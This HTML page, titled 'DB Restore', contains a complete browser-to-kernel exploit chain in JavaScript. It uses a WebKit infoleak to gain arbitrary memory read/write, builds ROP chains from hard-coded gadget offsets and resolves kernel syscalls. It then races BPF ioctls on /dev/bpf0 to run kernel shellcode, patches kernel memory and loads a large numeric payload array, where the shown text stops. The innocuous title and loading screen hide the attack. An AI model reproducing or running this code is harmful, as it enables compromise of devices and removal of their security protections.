<!DOCTYPE html>
<html>
<head>
<title>DB Restore</title>
<link rel="stylesheet prefetch" href="exploit.css">
</head>
<body>
<div id=loader class=loader><div class=ib2>DB Restore</div><div class=ib2>&nbsp;L</div><div class=loaderO></div><div class=ib2>ADING...</div></div>
<div id=done class=done style=display:none>DB Restore LOADED<br><div class=ib>PRESS</div><div id=PSBUTTON></div><div class=ib>TO EXIT</div></div>
<div id=fail class=info style=display:none>DB Restore FAILED</div>
<script>
var p;var s={};var g={};var gc={"pop_r8":96709,"pop_r9":12268047,"pop_rax":17397,"pop_rcx":339545,"pop_rdx":1826852,"pop_rsi":586634,"pop_rdi":232890,"pop_rsp":124551,"jmp_rax":130,"jmp_rdi":2711166,"mov_rdx_rax":3488561,"mov_rdi_rax":22692143,"mov_rax_rdx":1896224,"mov_rbp_rsp":985418,"mov__rdi__rax":3857131,"mov__rdi__rsi":146114,"mov__rax__rsi":2451047,"mov_rax__rax__":444474,"mov_rax__rdi__":290553,"add_rax_rsi":1384646,"and_rax_rsi":22481823,"add_rdi_rax":5593055,"jop":800720,"ret":60,"stack_chk_fail":200,"setjmp":5368};window.onload=function(){setTimeout(exploit,3000);};window.onerror=function(e){document.getElementById("loader").style.display="none";document.getElementById("fail").style.display="block";if(e.startsWith("Error:")==true){alert(e);}else{location.reload();}};function done(){document.getElementById("loader").style.display="none";document.getElementById("done").style.display="block";} var rop=function(){this.stack=new Uint32Array(65536);this.stackBase=p.read8(p.leakval(this.stack).add32(16));this.count=0;this.clear=function(){this.count=0;this.runtime=undefined;for(var i=0;i<4080/2;i++){p.write8(this.stackBase.add32(i*8),0);}};this.pushSymbolic=function(){this.count++;return this.count-1;};this.finalizeSymbolic=function(idx,val){p.write8(this.stackBase.add32(idx*8),val);};this.push=function(val){this.finalizeSymbolic(this.pushSymbolic(),val);};this.push_write8=function(where,what){this.push(g.pop_rdi);this.push(where);this.push(g.pop_rsi);this.push(what);this.push(g.mov__rdi__rsi);};this.fcall=function(rip,rdi,rsi,rdx,rcx,r8,r9){if(rdi!=undefined){this.push(g.pop_rdi);this.push(rdi);} if(rsi!=undefined){this.push(g.pop_rsi);this.push(rsi);} if(rdx!=undefined){this.push(g.pop_rdx);this.push(rdx);} if(rcx!=undefined){this.push(g.pop_rcx);this.push(rcx);} if(r8!=undefined){this.push(g.pop_r8);this.push(r8);} if(r9!=undefined){this.push(g.pop_r9);this.push(r9);} this.push(rip);return this;};this.run=function(){var retv=p.loadchain(this,this.notimes);this.clear();return retv;};return this;};function makeid(){var text="";var possible="ABCDFGHIJKMNOPQRSTUVWXYZLEefulabcdghijkmnopqrstvwxyz0123456789";for(var i=0;i<8;i++){text+=possible.charAt(Math.floor(Math.random()*possible.length));} return text;} var instancespr=[];for(var i=0;i<4096;i++){instancespr[i]=new Uint32Array(1);instancespr[i][makeid()]=50057;} var _dview;function u2d(low,hi){if(!_dview) _dview=new DataView(new ArrayBuffer(16));_dview.setUint32(0,hi);_dview.setUint32(4,low);return _dview.getFloat64(0);} function zeroFill(number,width){width-=number.toString().length;if(width>0){return new Array(width+(/\./.test(number)?2:1)).join("0")+number;} return number+"";} function int64(low,hi){this.low=(low>>>0);this.hi=(hi>>>0);this.add32=function(val){var new_lo=(((this.low>>>0)+val)&4294967295)>>>0;var new_hi=(this.hi>>>0);if(new_lo<this.low){new_hi++;} return new int64(new_lo,new_hi);};this.add32inplace=function(val){var new_lo=(((this.low>>>0)+val)&4294967295)>>>0;var new_hi=(this.hi>>>0);if(new_lo<this.low){new_hi++;} this.hi=new_hi;this.low=new_lo;};this.sub32=function(val){var new_lo=(((this.low>>>0)-val)&4294967295)>>>0;var new_hi=(this.hi>>>0);if(new_lo>(this.low)&4294967295){new_hi--;} return new int64(new_lo,new_hi);};this.sub32inplace=function(val){var new_lo=(((this.low>>>0)-val)&4294967295)>>>0;var new_hi=(this.hi>>>0);if(new_lo>(this.low)&4294967295){new_hi--;} this.hi=new_hi;this.low=new_lo;};this.toString=function(val){val=16;var lo_str=(this.low>>>0).toString(val);var hi_str=(this.hi>>>0).toString(val);if(this.hi==0) return lo_str;else{lo_str=zeroFill(lo_str,8);} return hi_str+lo_str;};return this;} var nogc=[];var tgt={a:0,b:0,c:0,d:0};var y=new ImageData(1,16384);postMessage("","*",[y.data.buffer]);var props={};for(var i=0;i<16384/2;){props[i++]={value:1111638594};props[i++]={value:tgt};} var foundLeak=undefined;var foundIndex=0;var maxCount=256;while(foundLeak==undefined&&maxCount>0){maxCount--;history.pushState(y,"");Object.defineProperties({},props);var leak=new Uint32Array(history.state.data.buffer);for(var i=0;i<leak.length-6;i++){if(leak[i]==1111638594&&leak[i+1]==4294901760&&leak[i+2]==0&&leak[i+3]==0&&leak[i+4]==0&&leak[i+5]==0&&leak[i+6]==14&&leak[i+7]==0&&leak[i+10]==0&&leak[i+11]==0&&leak[i+12]==0&&leak[i+13]==0&&leak[i+14]==14&&leak[i+15]==0){foundIndex=i;foundLeak=leak;break;}}} if(!foundLeak){throw new Error("infoleak fail");} Array.prototype.__defineGetter__(100,()=>1);var firstLeak=Array.prototype.slice.call(foundLeak,foundIndex,foundIndex+64);var leakJSVal=new int64(firstLeak[8],firstLeak[9]);var f=document.body.appendChild(document.createElement("iframe"));var a=new f.contentWindow.Array(13.37,13.37);var b=new f.contentWindow.Array(u2d(leakJSVal.low+16,leakJSVal.hi),13.37);var master=new Uint32Array(4096);var slave=new Uint32Array(4096);var leakval_u32=new Uint32Array(4096);var leakval_helper=[slave,2,3,4,5,6,7,8,9,10];tgt.a=u2d(2048,23077632);tgt.b=0;tgt.c=leakval_helper;tgt.d=4919;var c=Array.prototype.concat.call(a,b);document.body.removeChild(f);var hax=c[0];c[0]=0;tgt.c=c;hax[2]=0;hax[3]=0;Object.defineProperty(Array.prototype,100,{get:undefined});tgt.c=leakval_helper;var butterfly=new int64(hax[2],hax[3]);butterfly.low+=16;tgt.c=leakval_u32;var lkv_u32_old=new int64(hax[4],hax[5]);hax[4]=butterfly.low;hax[5]=butterfly.hi;tgt.c=master;hax[4]=leakval_u32[0];hax[5]=leakval_u32[1];var a2sb=new int64(master[4],master[5]);tgt.c=leakval_u32;hax[4]=lkv_u32_old.low;hax[5]=lkv_u32_old.hi;tgt.c=0;hax=0;var p={write8:function(addr,val){master[4]=addr.low;master[5]=addr.hi;if(val instanceof int64){slave[0]=val.low;slave[1]=val.hi;}else{slave[0]=val;slave[1]=0;} master[4]=a2sb.low;master[5]=a2sb.hi;},write4:function(addr,val){master[4]=addr.low;master[5]=addr.hi;slave[0]=val;master[4]=a2sb.low;master[5]=a2sb.hi;},read8:function(addr){master[4]=addr.low;master[5]=addr.hi;var rtv=new int64(slave[0],slave[1]);master[4]=a2sb.low;master[5]=a2sb.hi;return rtv;},read4:function(addr){master[4]=addr.low;master[5]=addr.hi;var rtv=slave[0];master[4]=a2sb.low;master[5]=a2sb.hi;return rtv;},leakval:function(jsval){leakval_helper[0]=jsval;var rtv=this.read8(butterfly);this.write8(butterfly,new int64(1094795585,4294901760));return rtv;}};var get_jmptgt=function(addr){var z=p.read4(addr)&65535;var y=p.read4(addr.add32(2));if(z!=9727) return 0;return addr.add32(y+6);};var exploit=function(){p.leakfunc=function(func){var fptr_store=p.leakval(func);return(p.read8(fptr_store.add32(24))).add32(64);};var parseFloatStore=p.leakfunc(parseFloat);var webKitBase=p.read8(parseFloatStore);webKitBase.low&=4294963200;webKitBase.sub32inplace(5881856-147456);var o2wk=function(o){return webKitBase.add32(o);};for(var gn in gc){if(gc.hasOwnProperty(gn)){g[gn]=o2wk(gc[gn]);}} var libKernelBase=p.read8(get_jmptgt(g.stack_chk_fail));libKernelBase.low&=4294963200;libKernelBase.sub32inplace(53248+16384);var wkview=new Uint8Array(4096);var wkstr=p.leakval(wkview).add32(16);p.write8(wkstr,webKitBase);p.write4(wkstr.add32(8),57131008);var hold1;var hold2;var holdz;var holdz1;while(1){hold1={a:0,b:0,c:0,d:0};hold2={a:0,b:0,c:0,d:0};holdz1=p.leakval(hold2);holdz=p.leakval(hold1);if(holdz.low-48==holdz1.low) break;} var pushframe=[];pushframe.length=128;var funcbuf;var funcbuf32=new Uint32Array(256);nogc.push(funcbuf32);var launch_chain=function(chain){var stackPointer=0;var stackCookie=0;var orig_reenter_rip=0;var reenter_help={length:{valueOf:function(){orig_reenter_rip=p.read8(stackPointer);stackCookie=p.read8(stackPointer.add32(8));var returnToFrame=stackPointer;var ocnt=chain.count;chain.push_write8(stackPointer,orig_reenter_rip);chain.push_write8(stackPointer.add32(8),stackCookie);if(chain.runtime) returnToFrame=chain.runtime(stackPointer);chain.push(g.pop_rsp);chain.push(returnToFrame);chain.count=ocnt;p.write8(stackPointer,(g.pop_rsp));p.write8(stackPointer.add32(8),chain.stackBase);}}};funcbuf=p.read8(p.leakval(funcbuf32).add32(16));p.write8(funcbuf.add32(48),g.setjmp);p.write8(funcbuf.add32(128),g.jop);p.write8(funcbuf,funcbuf);p.write8(parseFloatStore,g.jop);var orig_hold=p.read8(holdz1);var orig_hold48=p.read8(holdz1.add32(72));p.write8(holdz1,funcbuf.add32(80));p.write8(holdz1.add32(72),funcbuf);parseFloat(hold2,hold2,hold2,hold2,hold2,hold2);p.write8(holdz1,orig_hold);p.write8(holdz1.add32(72),orig_hold48);stackPointer=p.read8(funcbuf.add32(16));rtv=Array.prototype.splice.apply(reenter_help);return p.leakval(rtv);};p.loadchain=launch_chain;var kview=new Uint8Array(4096);var kstr=p.leakval(kview).add32(16);p.write8(kstr,libKernelBase);p.write4(kstr.add32(8),262144);var countbytes;for(var i=0;i<262144;i++){if(kview[i]==114&&kview[i+1]==100&&kview[i+2]==108&&kview[i+3]==111&&kview[i+4]==99){countbytes=i;break;}} p.write4(kstr.add32(8),countbytes+32);var dview32=new Uint32Array(1);var dview8=new Uint8Array(dview32.buffer);for(var i=0;i<countbytes;i++){if(kview[i]==72&&kview[i+1]==199&&kview[i+2]==192&&kview[i+7]==73&&kview[i+8]==137&&kview[i+9]==202&&kview[i+10]==15&&kview[i+11]==5){dview8[0]=kview[i+3];dview8[1]=kview[i+4];dview8[2]=kview[i+5];dview8[3]=kview[i+6];var syscallno=dview32[0];s[syscallno]=libKernelBase.add32(i);}} var chain=new rop();var returnvalue;p.fcall_=function(rip,rdi,rsi,rdx,rcx,r8,r9){chain.clear();chain.notimes=this.next_notime;this.next_notime=1;chain.fcall(rip,rdi,rsi,rdx,rcx,r8,r9);chain.push(g.pop_rdi);chain.push(chain.stackBase.add32(16376));chain.push(g.mov__rdi__rax);chain.push(g.pop_rax);chain.push(p.leakval(1094795842));if(chain.run().low!=1094795842){throw new Error("unexpected rop behaviour");} returnvalue=p.read8(chain.stackBase.add32(16376));};p.fcall=function(){p.fcall_.apply(this,arguments);return returnvalue;};p.readstr=function(addr){var addr_=addr.add32(0);var rd=p.read4(addr_);var buf="";while(rd&255){buf+=String.fromCharCode(rd&255);addr_.add32inplace(1);rd=p.read4(addr_);} return buf;};p.syscall=function(sysc,rdi,rsi,rdx,rcx,r8,r9){if(typeof sysc!="number"){throw new Error("invalid syscall");} var off=s[sysc];if(off==undefined){throw new Error("invalid syscall");} return p.fcall(off,rdi,rsi,rdx,rcx,r8,r9);};p.sptr=function(str){var bufView=new Uint8Array(str.length+1);for(var i=0;i<str.length;i++){bufView[i]=str.charCodeAt(i)&255;} nogc.push(bufView);return p.read8(p.leakval(bufView).add32(16));};p.malloc=function(sz){var backing=new Uint8Array(65536+sz);nogc.push(backing);var ptr=p.read8(p.leakval(backing).add32(16));ptr.backing=backing;return ptr;};p.malloc32=function(sz){var backing=new Uint8Array(65536+sz*4);nogc.push(backing);var ptr=p.read8(p.leakval(backing).add32(16));ptr.backing=new Uint32Array(backing.buffer);return ptr;};var test=p.syscall(23,0);if(test!="0"){var fd=p.syscall(5,p.sptr("/dev/bpf0"),2).low;var fd1=p.syscall(5,p.sptr("/dev/bpf0"),2).low;if(fd==(-1>>>0)){throw new Error("open bpf fail");} var bpf_valid=p.malloc32(16384);var bpf_spray=p.malloc32(16384);var bpf_valid_u32=bpf_valid.backing;var bpf_valid_prog=p.malloc(64);p.write8(bpf_valid_prog,2048/8);p.write8(bpf_valid_prog.add32(8),bpf_valid);var bpf_spray_prog=p.malloc(64);p.write8(bpf_spray_prog,2048/8);p.write8(bpf_spray_prog.add32(8),bpf_spray);for(var i=0;i<1024;){bpf_valid_u32[i++]=6;bpf_valid_u32[i++]=0;} var rtv=p.syscall(54,fd,2148549243,bpf_valid_prog);if(rtv.low!=0){throw new Error("ioctl bpf fail");} var spawnthread=function(name,chain){var longjmp=webKitBase.add32(5352);var createThread=webKitBase.add32(7836560);var contextp=p.malloc32(8192);var contextz=contextp.backing;contextz[0]=1337;var thread2=new rop();thread2.push(g.ret);thread2.push(g.ret);thread2.push(g.ret);thread2.push(g.ret);chain(thread2);p.write8(contextp,g.ret);p.write8(contextp.add32(16),thread2.stackBase);p.syscall(324,1);var retv=function(){p.fcall(createThread,longjmp,contextp,p.sptr(name));};nogc.push(contextp);nogc.push(thread2);return retv;};var interrupt1,loop1;var sock=p.syscall(97,2,2);var kscratch=p.malloc32(4096);var start1=spawnthread("GottaGoFast",function(thread2){interrupt1=thread2.stackBase;thread2.push(g.ret);thread2.push(g.ret);thread2.push(g.ret);thread2.push(g.pop_rdi);thread2.push(fd);thread2.push(g.pop_rsi);thread2.push(2148549243);thread2.push(g.pop_rdx);thread2.push(bpf_valid_prog);thread2.push(g.pop_rsp);thread2.push(thread2.stackBase.add32(2048));thread2.count=256;var cntr=thread2.count;thread2.push(s[54]);thread2.push_write8(thread2.stackBase.add32(cntr*8),s[54]);thread2.push(g.pop_rdi);var wherep=thread2.pushSymbolic();thread2.push(g.pop_rsi);var whatp=thread2.pushSymbolic();thread2.push(g.mov__rdi__rsi);thread2.push(g.pop_rsp);loop1=thread2.stackBase.add32(thread2.count*8);thread2.push(1094795585);thread2.finalizeSymbolic(wherep,loop1);thread2.finalizeSymbolic(whatp,loop1.sub32(8));});var krop=new rop();var race=new rop();var ctxp=p.malloc32(8192);var ctxp1=p.malloc32(8192);var ctxp2=p.malloc32(8192);p.write8(bpf_spray.add32(16),ctxp);p.write8(ctxp.add32(80),0);p.write8(ctxp.add32(104),ctxp1);var stackshift_from_retaddr=0;p.write8(ctxp1.add32(16),o2wk(19536333));stackshift_from_retaddr+=8+88;p.write8(ctxp.add32(0),ctxp2);p.write8(ctxp.add32(16),ctxp2.add32(8));p.write8(ctxp2.add32(2000),o2wk(7271653));var iterbase=ctxp2;for(var i=0;i<15;i++){p.write8(iterbase,o2wk(19536333));stackshift_from_retaddr+=8+88;p.write8(iterbase.add32(2000+32),o2wk(7271653));p.write8(iterbase.add32(8),iterbase.add32(32));p.write8(iterbase.add32(24),iterbase.add32(32+8));iterbase=iterbase.add32(32);} var raxbase=iterbase;var rdibase=iterbase.add32(8);var memcpy=get_jmptgt(webKitBase.add32(248));memcpy=p.read8(memcpy);p.write8(raxbase,o2wk(22848539));stackshift_from_retaddr+=8;p.write8(rdibase.add32(112),o2wk(19417140));stackshift_from_retaddr+=8;p.write8(rdibase.add32(24),rdibase);p.write8(rdibase.add32(8),krop.stackBase);p.write8(raxbase.add32(48),g.mov_rbp_rsp);p.write8(rdibase,raxbase);p.write8(raxbase.add32(1056),o2wk(2566497));p.write8(raxbase.add32(64),memcpy.add32(194-144));var topofchain=stackshift_from_retaddr+40;p.write8(rdibase.add32(176),topofchain);for(var i=0;i<4096/8;i++){p.write8(krop.stackBase.add32(i*8),g.ret);} krop.count=16;var kpatch=function(offset,qword){krop.push(g.pop_rax);krop.push(kscratch);krop.push(g.mov_rax__rax__);krop.push(g.pop_rsi);krop.push(offset);krop.push(g.add_rax_rsi);krop.push(g.pop_rsi);krop.push(qword);krop.push(g.mov__rax__rsi);};var kpatch2=function(offset,offset2){krop.push(g.pop_rax);krop.push(kscratch);krop.push(g.mov_rax__rax__);krop.push(g.pop_rsi);krop.push(offset);krop.push(g.add_rax_rsi);krop.push(g.mov_rdi_rax);krop.push(g.pop_rax);krop.push(kscratch);krop.push(g.mov_rax__rax__);krop.push(g.pop_rsi);krop.push(offset2);krop.push(g.add_rax_rsi);krop.push(g.mov__rdi__rax);};p.write8(kscratch.add32(1056),g.pop_rdi);p.write8(kscratch.add32(64),g.pop_rax);p.write8(kscratch.add32(24),kscratch);krop.push(g.pop_rdi);krop.push(kscratch.add32(24));krop.push(g.mov_rbp_rsp);var rboff=topofchain-krop.count*8+40;krop.push(o2wk(2566497));krop.push(g.pop_rax);krop.push(rboff);krop.push(g.add_rdi_rax);krop.push(g.mov_rax__rdi__);krop.push(g.pop_rsi);krop.push(762);krop.push(g.add_rax_rsi);krop.push(g.mov__rdi__rax);var shellbuf=p.malloc32(4096);krop.push(g.pop_rdi);krop.push(kscratch);krop.push(g.mov__rdi__rax);krop.push(g.pop_rsi);krop.push(808116);krop.push(g.add_rax_rsi);krop.push(g.pop_rdi);krop.push(kscratch.add32(8));krop.push(g.mov__rdi__rax);krop.push(g.jmp_rax);krop.push(g.pop_rdi);krop.push(kscratch.add32(16));krop.push(g.mov__rdi__rax);krop.push(g.pop_rsi);krop.push(new int64(4294901759,4294967295));krop.push(g.and_rax_rsi);krop.push(g.mov_rdx_rax);krop.push(g.pop_rax);krop.push(kscratch.add32(8));krop.push(g.mov_rax__rax__);krop.push(g.pop_rsi);krop.push(9);krop.push(g.add_rax_rsi);krop.push(g.mov_rdi_rax);krop.push(g.mov_rax_rdx);krop.push(g.jmp_rdi);krop.push(g.pop_rax);krop.push(kscratch);krop.push(g.mov_rax__rax__);krop.push(g.pop_rsi);krop.push(221338);krop.push(g.add_rax_rsi);krop.push(g.mov_rax__rax__);krop.push(g.pop_rdi);krop.push(kscratch.add32(816));krop.push(g.mov__rdi__rax);kpatch(221338,new int64(2425420344,2425393296));kpatch(20169540,shellbuf);kpatch(new int64(4293816070,4294967295),new int64(184,3297329408));kpatch(new int64(4293470503,4294967295),new int64(0,1082624841));kpatch(new int64(4293470533,4294967295),new int64(2425388523,1922076816));kpatch(new int64(4294769332,4294967295),new int64(934690871,826654769));kpatch(828366,new int64(233,2336788480));kpatch(1329844,new int64(2428747825,2425393296));kpatch(new int64(15789236,0),new int64(2,0));kpatch2(new int64(15789244,0),new int64(4293548276,4294967295));kpatch(new int64(15789276,0),new int64(0,1));krop.push(g.pop_rax);krop.push(kscratch.add32(8));krop.push(g.mov_rax__rax__);krop.push(g.pop_rsi);krop.push(9);krop.push(g.add_rax_rsi);krop.push(g.mov_rdi_rax);krop.push(g.pop_rax);krop.push(kscratch.add32(16));krop.push(g.mov_rax__rax__);krop.push(g.jmp_rdi);krop.push(o2wk(380345));krop.push(kscratch.add32(4096));var kq=p.malloc32(16);var kev=p.malloc32(256);kev.backing[0]=sock;kev.backing[2]=131071;kev.backing[3]=1;kev.backing[4]=5;var shcode=[35817,2425393152,2425393296,2425393296,8567125,2303246336,1096172005,1398030677,2303275535,3149957588,256,551862601,1220806985,9831821,2370371584,4265616532,2370699263,3767542964,2370633744,1585456300,2169045059,1265721540,277432321,4202255,698,3867757568,524479,3607052544,960335176,1207959552,3224487561,2211839809,3698655723,1103114587,1096630620,2428722526,1032669269,4294967160,2303260209,15293925,1207959552,770247,2303262720,3271888842,1818324331,979595116,628633632,1815490864,2648,0,0,0,0,0,0,0,0,0,0,0,0,0,0];for(var i=0;i<shcode.length;i++){shellbuf.backing[i]=shcode[i];} start1();while(1){race.count=0;race.push(s[362]);race.push(g.pop_rdi);race.push(kq);race.push(g.mov__rdi__rax);race.push(g.ret);race.push(g.ret);race.push(g.ret);race.push(g.ret);race.push_write8(loop1,interrupt1);race.push(g.pop_rdi);race.push(fd);race.push(g.pop_rsi);race.push(2148549243);race.push(g.pop_rdx);race.push(bpf_valid_prog);race.push(s[54]);race.push(g.pop_rax);race.push(kq);race.push(g.mov_rax__rax__);race.push(g.mov_rdi_rax);race.push(g.pop_rsi);race.push(kev);race.push(g.pop_rdx);race.push(1);race.push(g.pop_rcx);race.push(0);race.push(g.pop_r8);race.push(0);race.push(s[363]);race.push(g.pop_rdi);race.push(fd1);race.push(g.pop_rsi);race.push(2148549243);race.push(g.pop_rdx);race.push(bpf_spray_prog);race.push(s[54]);race.push(g.pop_rax);race.push(kq);race.push(g.mov_rax__rax__);race.push(g.mov_rdi_rax);race.push(s[6]);race.run();if(kscratch.backing[0]!=0){p.syscall(74,shellbuf,16384,7);p.fcall(shellbuf);break;}}} var createThread=webKitBase.add32(7836560);var payloadbuf=p.malloc32(16384);
var payload = [233,2303218432,329967867,2380791808,1207959566,47920525,2303197184,770010,3224436736,1525992,172812288,4290379776,3187671041,1537,1614646600,3892314135,863,268433539,108421,33536512,29229056,1207959558,391396749,1088946176,2197815299,2232418296,178,1379765576,3892314135,2664,1597869384,3892314135,1062,645185669,1932889416,1207959575,395459981,2213019648,1207959556,394671501,2370306048,1520957,74508288,2370306048,1544253,66119680,3229941760,2370315892,1550389,1032669184,6091,282088,898451456,6079,1715309896,3892314135,1082,3443363144,3892314135,954,2215624837,462,3879046472,1207959575,403717517,333971456,1207959556,402929037,2370306048,1548093,27519232,3347644416,166632,1032669184,6203,634856,1032669184,5754,163560,33537536,2370306048,1585981,48621568,2370306048,1588285,55633920,3229941760,2370315892,1591093,1032669184,5820,241128,898451456,5808,306023752,3892314136,922,1161661768,3892314136,794,645185669,1412795720,1207959576,385170829,2011693056,1207959555,384382349,2370306048,1579837,56944640,2370306048,1594941,48556032,3229941760,16286735,2370306048,1599285,1032669184,5946,212456,898451456,5934,675122504,3909091352,205,3035154313,1207959553,409484685,3655860224,1207959560,361840013,2833776640,3187671041,511,1614646600,3892314136,527,1765641544,3892314136,634,645185669,1949666632,1207959576,367410573,3622305792,1207959554,366622093,2370306048,1589053,46458880,2370306048,1602109,38070272,3229941760,2370315892,1605941,1032669184,5663,172520,898451456,5651,1211993416,3892314136,654,2201849160,3892314136,526,645185669,2553646408,1207959576,375930253,1810366464,1207959554,375141773,2370306048,1595709,39380992,2370306048,1470525,135194624,146735104,4278190080,2169621,3904909568,2802,3277570097,268011848,3804317746,3490269216,1200310467,8567048,2336800768,2337030256,839862336,1221691720,18388619,3242721280,155721953,71747528,0,29371720,1187446784,8,340182784,0,711,2336751616,159817872,1451837441,3397601328,2156611839,36444784,541100361,406882633,814189384,1207959553,5055,16777216,1351174200,2022262880,1351174232,3223326568,1220708680,4294959745,571473918,3223457730,1220788273,245959,3723034624,1207959571,311495,3521708032,1207959571,377031,3320381440,1207959571,442567,3119054848,1207959571,704711,2917728256,1207959571,639175,2716401664,1207959571,3850439,2515075072,1207959571,3784903,2313748480,1207959571,1425607,2112421888,1207959571,24821959,1911095296,1207959571,1491143,1709768704,1207959571,8110279,1508442112,1207959571,8175815,1307115520,1207959571,8437959,1105788928,1207959571,8962247,904462336,1207959571,9027783,703135744,1207959571,12370119,501809152,1207959571,12435655,300482560,1207959571,12501191,99155968,1207959571,17875143,4192796672,1207959570,31375559,3991470080,1207959570,32358599,3790143488,1207959570,2303261321,4130427121,154303,3904909568,4809,3526476634,3897685553,4294967023,4169388593,2299294975,4277004487,29032447,2298478592,1371757264,510531071,3526426624,1958774088,3347662862,516298239,28966912,2298478592,1220762320,8973441,2370306048,3892847732,4294967143,2248133251,2333178048,823141444,2451154,4024048,3264483232,2169032841,35012,1413595904,1398133297,838043976,4269140214,4169400319,3127866623,511,393662,3750316032,1558758793,2214592510,2302803960,3209196740,4194304,482743807,2236088320,3280554176,12201332,1207975936,4018790025,4294843112,3229960447,2303201396,3733539010,3907488068,4294966803,2303253739,689307615,1140850718,417916809,1543503870,1096675209,4262324572,1566310399,1103322177,1096171863,1431585109,3967895635,2200,1241418057,369096585,7548,264275272,60036,33537536,2303459328,3297331711,615288136,144,4294856424,1150109951,2370574372,76555436,2303197184,1275601988,369092489,7224,264275272,42372,1485654016,898451464,4945,4292839752,1911573,1958774016,898451670,4924,4292839752,1906453,1958774016,3649652930,1223854412,355153293,2303197184,4290785775,1905429,3649652736,1224378700,353580429,2303459328,4290785775,1899285,1955284992,2303199268,4258916591,3230007295,1149993333,627449892,1030156288,276119552,1223592268,417918857,3925868543,4294967139,2147499366,4284056847,2303524863,4018751726,4294866408,4283034111,2303524863,4044750823,1207959580,144229505,1566244864,1564564545,1598119489,827802051,1096171986,1431585109,4085860435,3908448593,4294966467,4130460209,1105168712,3035153545,3221225468,65536,369083785,6948,16777407,3330885888,454432255,2235891712,209981412,2231369729,75763693,822083585,178934,2302935040,3314108903,4294790888,3136696831,2,1089007497,838860797,113398,2302935040,4247906535,4130471935,442,1223657728,552125321,838860797,1156985298,2303321993,4245809351,3526492159,4018796081,4294772456,4214836479,3677423476,36329,4219684864,6600803,1326383104,178904,3690397696,1223133508,2303253347,4242139358,2303262719,178910,4018733056,4294757096,113407,2303459328,3884532982,4294691560,113407,2303459328,3347663342,3280596873,4294686440,4286924287,960569470,823883207,1284129216,943783941,2390033932,968949576,3152969667,1,3677422315,4294412620,1815317,4018752512,464131583,2302935040,4221167847,4018798591,4294677224,822275071,3632880347,1547787611,1581342017,1220763457,3122195587,1,611618120,4215924751,3397648383,3229960447,3188655476,2299470932,3296938192,1463927576,1430345281,1398101057,686588744,2303209099,1275602004,270812297,2282745221,168,1224918403,1665727625,1066092765,82035016,1240893769,2303250313,555089886,1275068442,270812299,1237353800,1965294729,113721609,4294967295,2370597611,2336809067,1275602044,2303518721,1209541700,270812297,438703615,2336751616,1209017428,136608907,1292011848,4280560643,1750805,1149979648,4282914852,1166625216,76237064,4169353508,2089372927,360050712,1304441157,225771397,4294936908,1739541,1083001856,76237057,3227733284,407144780,780747256,683967304,1547787611,1581342017,1103322945,1096171863,1431585109,3968026707,4270410008,611093832,1552762884,2303264804,3431549431,1223592264,2303250825,361580767,4627,1237682501,1224722563,136594631,0,69485767,0,4294892008,3364047359,4186524927,4011167048,1207959569,2303258249,4274055391,2202664959,2303524808,361580785,4573,1223592264,2817056649,1241513982,1224722563,298585485,2370306048,1165589,4001974272,3906963784,4294966922,4291330889,3104673096,1207959569,297342349,2303197184,3750316270,4294864360,3364047359,227363071,4713,2769653064,1207959569,2303258249,4266715359,2202664959,2370371528,1199117,361580544,4494,1223592264,870899593,1308622846,846521477,4291330889,1222740300,293213581,2303197184,3750316270,4294841832,3364047359,3783871743,1679134024,1207959569,2303258249,4261210335,1955332095,2302936100,2089502954,2364016676,1224736761,1528349827,1096565085,1096696157,1398129503,1355362629,834679109,835858889,1032669430,4392,433722879,3375431680,2311663941,3224454597,4130460209,859671880,4278190097,1687317,1223657728,384701837,3280535552,1194691912,3892314129,838,1541376345,3843394888,1560281110,1479904584,3909091345,814,4203300947,15499592,1207959554,291648909,2303197184,4290785767,1598229,3867756544,33215,2635464448,1207959574,33604737,3277520896,637531697,5788,3375449427,283935560,834679109,835858889,1032669430,4394,422974975,2370306048,1466133,898451456,4416,3347694473,179688,361580544,5744,1110805832,2298478609,44624095,2370306048,1467157,898451456,4430,2481512329,822083586,487981055,2231369750,1209234880,369092489,5688,108380293,372643327,2336751616,2336760836,1208493140,1527825539,826627011,3968026825,3224454416,3526478129,2370369073,1088829,2836791040,1207959576,366089613,2370306048,1094453,2311293184,36759751,2370306048,1434389,898451456,4277,468246409,1207959554,366351757,2370306048,1098037,3906963712,518,369098545,5520,91537541,3959408771,3884533788,363206143,3229941760,1015279221,3899981604,362681855,76218368,3296938020,1103321872,1095980372,2202598537,280961260,4278190080,1429269,3375449344,834679109,835858889,1032669430,4090,4291135816,1573653,361580544,5420,221613384,2298478608,3905391043,394,890604872,1207959573,273167757,3750297600,95720,361580544,5424,456494408,2298478608,23128287,4281401344,350885375,3526426624,863355013,610045256,1161743,2303197184,3884532958,351147519,3526426624,393592965,1222543688,369094537,5380,369082417,5348,1223330120,1210107011,1566298249,1405312065,1221144901,1158737027,3375480881,4130460209,1262325064,4278190095,1529621,361580544,5264,3442838856,2298478607,3905391043,222,1763020104,1207959572,256521613,3750297600,51688,361580544,5252,1865780552,2298478607,11856095,4281401344,339613183,3229941760,2370312565,4278985852,1326869,1975551232,1427504906,2332033044,1208755268,1527825539,2370327491,1016885,35438336,3224436736,645352,1073789440,3375431680,2311293256,35831750,3224436736,639208,3219032320,541,3001598001,1526726665,7866,114176,633274368,822083584,161212864,826605568,826626249,835269056,1224094162,255344013,369033216,5760,3776286024,1207959571,256259469,3347644416,2536,3224459776,332015103,3343384576,151488,156952832,3343384576,151744,156166400,1213202432,23070407,2303197184,2311074290,38911998,854065152,1509949449,4052306115,1221734736,826670729,38977472,3224436736,596200,2311281152,3526447358,1405077809,822083586,151251136,3277455360,827377969,1224094162,248921485,826605568,3224454601,367400447,1213792256,323884429,2370306048,970805,3922168064,4294967150,3375449427,834679109,835858889,1032669430,3788,364254719,2370306048,1269525,898451456,3792,3347694473,4294917608,1222609407,350098829,2370306048,966197,4280870912,3750363135,1494584648,1207959571,246297997,333971456,2315255807,361580767,5044,2687864136,3892314126,4294967038,2370363273,1326869,898451456,3731,4294896104,1222609407,334108045,2370306048,952117,4275365888,3750363135,3306523976,1207959570,242824589,3219652608,2315255806,361580767,4976,1798671688,3892314126,4294966954,2370363273,1211157,898451456,3677,4294874600,1222609407,321787277,2370306048,937781,4269860864,3750363135,3642068296,1207959570,239220109,1810366464,2315255806,361580767,4908,875924808,3892314126,4294966870,2370363273,1300245,898451456,3623,4294853096,1222609407,326243725,2370306048,923957,4264355840,3750363135,3172306248,1207959570,235615629,401080320,2315255806,361580767,4960,4264922440,3892314125,4294966786,2370363273,1174293,898451456,3569,4294831592,1222609407,312874381,2370306048,910645,4258850816,3750363135,1628802376,1207959571,232207757,3286761472,23152558